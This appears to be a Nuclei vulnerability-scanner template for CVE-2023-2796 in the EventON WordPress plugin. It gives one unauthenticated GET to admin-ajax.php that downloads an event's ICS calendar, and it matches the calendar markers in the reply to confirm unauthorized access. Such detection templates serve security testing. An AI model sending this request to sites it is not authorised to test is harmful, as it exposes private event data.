id: eventon-unauthorized-access
info:
  name: EventON Unauthorized Access Vulnerability (CVE-2023-2796)
  author: ProjectDiscoveryAI
  severity: medium
  tags: CVE-2023-2796,unauthorized-access,eventon
http:
  - method: GET
    path:
      - "{{BaseURL}}/wp-admin/admin-ajax.php?action=eventon_ics_download&event_id=1"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "BEGIN:VCALENDAR"
          - "END:VCALENDAR"
        part: body
      - type: word
        words:
          - "text/calendar"
        part: header
